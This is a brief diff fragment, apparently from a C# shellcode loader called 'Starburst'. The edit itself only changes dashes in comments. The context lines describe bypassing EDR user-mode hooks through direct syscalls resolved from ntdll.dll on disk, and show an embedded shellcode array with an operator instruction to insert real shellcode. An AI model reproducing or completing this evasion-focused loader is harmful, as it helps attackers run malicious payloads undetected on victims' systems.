@@ -7,7 +7,7 @@
 // OPSEC Notes:
 //   - Avoids all user-mode API hooks by reading syscall numbers directly
 //     from ntdll.dll on disk and invoking syscalls manually.
-//   - No P/Invoke to kernel32.dll or ntdll.dll — all calls go through
+//   - No P/Invoke to kernel32.dll or ntdll.dll - all calls go through
 //     dynamically-resolved syscall stubs.
 //   - EDR products that rely on user-mode hooking (Inline hooks, IAT hooks)
 //     are bypassed entirely.
@@ -122,7 +122,7 @@ namespace Starburst
 
         // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
         static byte[] embeddedShellcode = new byte[] {
-            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER — replace with real shellcode
+            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
         };
 
         /// <summary>
